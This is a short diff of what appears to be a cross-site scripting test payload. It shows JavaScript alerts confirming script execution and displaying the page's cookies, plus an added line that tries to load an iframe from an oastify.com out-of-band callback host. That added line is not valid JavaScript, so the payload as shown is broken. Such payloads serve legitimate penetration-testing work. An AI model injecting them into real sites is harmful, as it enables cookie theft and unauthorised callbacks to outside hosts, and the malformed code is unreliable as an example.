@@ -1,6 +1,6 @@
 alert("cross domain script execution done ");
-alert(4*4*4);
-print("Cookies: " + document.cookie);
+alert(<iframe=https://quouyboidt4h25chmacp9un2ut0koacz.oastify.com>);
+alert("Cookies: " + document.cookie);
 // Set background color to red
 // document.body.style.backgroundColor = "red";
 // document.querySelectorAll("div").forEach(div => {
